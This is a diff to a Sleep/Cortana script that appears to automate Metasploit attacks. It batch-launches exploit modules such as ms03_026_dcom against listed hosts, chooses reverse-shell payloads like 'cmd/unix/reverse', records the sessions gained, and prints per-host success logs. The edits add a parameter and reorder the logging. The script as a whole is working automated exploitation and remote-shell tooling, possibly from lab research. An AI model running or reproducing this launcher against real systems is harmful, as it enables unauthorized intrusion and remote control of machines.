@@ -5,8 +5,9 @@ command arguments {
    #@attacks = split(';', "172.16.221.133,windows/dcerpc/ms03_026_dcom,172.16.221.1,6.0;172.16.221.132,windows/dcerpc/ms03_026_dcom,172.16.221.1,6.0;");
    @attacks = split(';', "$2");
    $minBin = $3;
+   $numExisting = $4;
 
-   fire_event_local("prep_attacks", $counter, @attacks, $minBin);
+   fire_event_local("prep_attacks", $counter, @attacks, $minBin, $numExisting);
 }
 
 on prep_attacks {
@@ -54,11 +55,15 @@ on prep_attacks {
       %num_exps[$tempHost] += 1;  
    }
 
+   if ($limit eq 14) {
+      println(%num_exps);
+   } 
+
    #println(%h);
    #println(%num_exps);
    #println(@hosts);
    #println(%exploits);
-   fire_event_local("launch_attacks", %h, $numBins, %num_exps, @hosts, %exploits);
+   fire_event_local("launch_attacks", %h, $numBins, %num_exps, @hosts, %exploits, $4);
    #quit();
 }
 
@@ -124,15 +129,16 @@ sub determinePayload {
    return "cmd/unix/reverse";
 }
 
-# $1 = %h, $2 = $numBins, $3 = %num_exps, $4 = @hosts, $5 = %exploits
+# $1 = %h, $2 = $numBins, $3 = %num_exps, $4 = @hosts, $5 = %exploits, $6 = $numExisting
 on launch_attacks {  
-   local('$console %h $numBins %num_exps @hosts %exploits %attacks $payload $i $host $bin $count $attack %exp_run $rhost $name $lhost $os $exploit');
+   local('$console %h $numBins %num_exps @hosts %exploits %attacks $payload $i $host $bin $count $attack %exp_run $rhost $name $lhost $os $exploit $numExisting');
 
    %h = $1;
    $numBins = $2;
    %num_exps = $3;
    @hosts = $4;
    %exploits = $5;
+   $numSessions = $6;
 
    $console = console();
    cmd($console, "jobs -K");
@@ -144,6 +150,7 @@ on launch_attacks {
 
    for ($i = 0; $i < size(@hosts); $i++) {
       $host = @hosts[$i];
+      #println("Num exploits for $host : " . %num_exps[$host]);
       while ($count < %num_exps[$host]) {
          $bin = -1;
          while ($bin < 0) {
@@ -221,15 +228,14 @@ on sessionHandle {
       $port = %r["session_port"];
 
       if ($host in @hosts) {
-         remove(@hosts, $host);
-      }
-
-      $numRun = %exp_run[$host];
-   	println("$host" . "," . "$flag" . "," . "$sessionNum" . "," . "$user" . "," . "$exploit" . "," . "$type" . "," . "$port" . "," . "$numRun");
-      for ($i = 0; $i < 2; $i++) {
-         for ($j = 0; $j < size(%exploits[$host][$i]); $j++) {
-            println(%exploits[$host][$i][$j] . "," . $i);
+         $numRun = %exp_run[$host];
+   	   println("$host" . "," . "$flag" . "," . "$sessionNum" . "," . "$user" . "," . "$exploit" . "," . "$type" . "," . "$port" . "," . "$numRun");
+         for ($i = 0; $i < 2; $i++) {
+            for ($j = 0; $j < size(%exploits[$host][$i]); $j++) {
+               println(%exploits[$host][$i][$j] . "," . $i);
+            }
          }
+         remove(@hosts, $host);
       }
    }
 
@@ -244,12 +250,12 @@ on noSessions {
    %exp_run = $3;
 
    foreach $host (@hosts) {
+      println(%exploits);
       $numRun = %exp_run[$host];
       println("$host" . ",false,0,0,0,0,0," . "$numRun");
       for ($i = 0; $i < 2; $i++) {
          for ($j = 0; $j < size(%exploits[$host][$i]); $j++) {
-            $name = split(',', %exploits[$host][$i][$j])[1];
-            println("$name" . "," . "$i");
+            println(%exploits[$host][$i][$j] . "," . $i);
          }
       }
    }
